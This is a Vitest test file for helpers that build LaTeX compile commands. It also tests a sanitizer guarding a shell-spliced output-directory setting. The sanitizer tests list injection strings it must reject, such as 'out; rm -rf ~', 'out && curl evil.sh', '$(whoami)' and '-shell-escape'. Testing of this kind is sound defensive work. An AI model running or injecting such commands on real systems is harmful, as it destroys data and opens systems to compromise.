import { describe, it, expect } from 'vitest';
import {
	compileOutDir,
	detectEngine,
	usesLatexmk,
	buildCompileCommand,
	resolveOutputPath,
	detectedPdfPath,
	expectedPdfPath,
	expectedLogPath,
	outputPathIssue,
	sanitizeOutputDir,
	withOutputDir
} from '$lib/workspace/compileCommand';

const DEFAULT = 'latexmk -lualatex -interaction=nonstopmode -file-line-error -synctex=1 -output-directory=output {main}';

describe('compileCommand', () => {
	it('reads the output directory, defaulting to .', () => {
		expect(compileOutDir(DEFAULT)).toBe('output');
		expect(compileOutDir('pdflatex {main}')).toBe('.');
		expect(compileOutDir('latexmk -outdir="my out" {main}')).toBe('my out');
	});

	it('detects the engine (or null for the unrecognized)', () => {
		expect(detectEngine(DEFAULT)).toBe('lualatex');
		expect(detectEngine('xelatex {main}')).toBe('xelatex');
		expect(detectEngine('pdflatex {main}')).toBe('pdflatex');
		expect(detectEngine('latexmk -pdf {main}')).toBe('pdflatex');
		expect(detectEngine('make')).toBeNull();
		expect(detectEngine('tectonic {main}')).toBeNull();
		expect(usesLatexmk(DEFAULT)).toBe(true);
		expect(usesLatexmk('pdflatex {main}')).toBe(false);
	});

	it('regenerates a command carrying the output dir over', () => {
		expect(buildCompileCommand('xelatex', true, DEFAULT)).toBe(
			'latexmk -xelatex -interaction=nonstopmode -file-line-error -synctex=1 -output-directory=output {main}'
		);
		expect(buildCompileCommand('pdflatex', false, 'pdflatex {main}')).toBe(
			'pdflatex -interaction=nonstopmode -file-line-error -synctex=1 -output-directory=output {main}'
		);
	});

	it('resolves detected and overridden output paths', () => {
		const root = '/proj';
		const main = '/proj/main.tex';
		expect(detectedPdfPath(DEFAULT, root, main)).toBe('/proj/output/main.pdf');
		expect(detectedPdfPath('pdflatex {main}', root, main)).toBe('/proj/main.pdf');
		expect(detectedPdfPath(DEFAULT, null, main)).toBeNull();
		// a relative override is joined to root; absolute stays put
		expect(resolveOutputPath(root, 'build/out.pdf')).toBe('/proj/build/out.pdf');
		expect(resolveOutputPath(root, '/abs/out.pdf')).toBe('/abs/out.pdf');
		expect(expectedPdfPath(DEFAULT, root, main, 'build/x.pdf')).toBe('/proj/build/x.pdf');
		// the log sits next to the actual pdf, following the override
		expect(expectedLogPath(DEFAULT, root, main)).toBe('/proj/output/main.log');
		expect(expectedLogPath(DEFAULT, root, main, { pdf: 'build/x.pdf' })).toBe('/proj/build/x.log');
		expect(expectedLogPath('latexmk -auxdir=aux -output-directory=out {main}', root, main)).toBe('/proj/aux/main.log');
	});

	it('flags bad Advanced output paths', () => {
		expect(outputPathIssue('', '.pdf')).toBeNull();
		expect(outputPathIssue('out/main.pdf', '.pdf')).toBeNull();
		expect(outputPathIssue('{main}.pdf', '.pdf')).toBe('has-token');
		expect(outputPathIssue('main.tex', '.pdf')).toBe('wrong-ext');
	});
});

// The MCP set_output_paths tool splices a caller-supplied directory into a shell command line, and
// is deliberately NOT behind the permission gate that set_compile_command is. sanitizeOutputDir is
// the entirety of what makes that safe, so it is tested as a boundary, not as a formatter.
describe('sanitizeOutputDir', () => {
	it('accepts ordinary relative, nested and absolute directories', () => {
		expect(sanitizeOutputDir('output')).toBe('output');
		expect(sanitizeOutputDir('build/paper')).toBe('build/paper');
		expect(sanitizeOutputDir('../shared/build')).toBe('../shared/build'); // monorepos build out of tree
		expect(sanitizeOutputDir('.build')).toBe('.build');
		expect(sanitizeOutputDir('/var/tmp/out')).toBe('/var/tmp/out');
		expect(sanitizeOutputDir('C:/builds/paper')).toBe('C:/builds/paper');
	});

	it('folds Windows separators, which also removes the POSIX escape character', () => {
		expect(sanitizeOutputDir('build\\paper')).toBe('build/paper');
		expect(sanitizeOutputDir('C:\\builds')).toBe('C:/builds');
	});

	it('quotes a directory containing spaces, so it stays ONE argument', () => {
		expect(sanitizeOutputDir('my build')).toBe('"my build"');
		expect(sanitizeOutputDir('  padded  ')).toBe('padded'); // trimmed, so no needless quoting
	});

	it('refuses every shell metacharacter', () => {
		for (const bad of [
			'out; rm -rf ~',
			'out && curl evil.sh',
			'out | tee /etc/passwd',
			'$(whoami)',
			'`whoami`',
			'out$HOME',
			'out"quoted',
			"out'quoted",
			'out\nsecond',
			'out>file',
			'out<file',
			'a{b,c}',
			'out&'
		])
			expect(sanitizeOutputDir(bad), bad).toBeNull();
	});

	it('refuses a leading dash, which the engine would read as another flag', () => {
		expect(sanitizeOutputDir('-shell-escape')).toBeNull();
		expect(sanitizeOutputDir('--output')).toBeNull();
	});

	it('refuses nothing at all', () => {
		expect(sanitizeOutputDir('')).toBeNull();
		expect(sanitizeOutputDir('   ')).toBeNull();
	});
});

describe('withOutputDir', () => {
	it('substitutes in place, keeping every other flag', () => {
		expect(withOutputDir(DEFAULT, 'build')).toBe(
			'latexmk -lualatex -interaction=nonstopmode -file-line-error -synctex=1 -output-directory=build {main}'
		);
		// the separator style the command already used is preserved
		expect(withOutputDir('pdflatex -output-directory out {main}', 'build')).toBe('pdflatex -output-directory build {main}');
		expect(withOutputDir('latexmk -outdir=old {main}', 'new')).toBe('latexmk -outdir=new {main}');
		expect(withOutputDir('latexmk -outdir="old dir" {main}', 'new')).toBe('latexmk -outdir=new {main}');
	});

	it('inserts before {main} when the command has no such flag', () => {
		// after the file name it is ignored by some engines and taken as a job name by others
		expect(withOutputDir('pdflatex {main}', 'build')).toBe('pdflatex -output-directory=build {main}');
		expect(withOutputDir('make paper', 'build')).toBe('make paper -output-directory=build');
	});

	it('treats the directory as a literal, not a replacement pattern', () => {
		// '$&' and friends are special to String.replace; a sanitized dir cannot contain them, but
		// the function must not depend on that to stay correct
		expect(withOutputDir('pdflatex -outdir=a {main}', '"my build"')).toBe('pdflatex -outdir="my build" {main}');
	});

	it('round-trips with compileOutDir', () => {
		for (const dir of ['build', 'build/paper', '../out']) expect(compileOutDir(withOutputDir(DEFAULT, dir))).toBe(dir);
	});
});
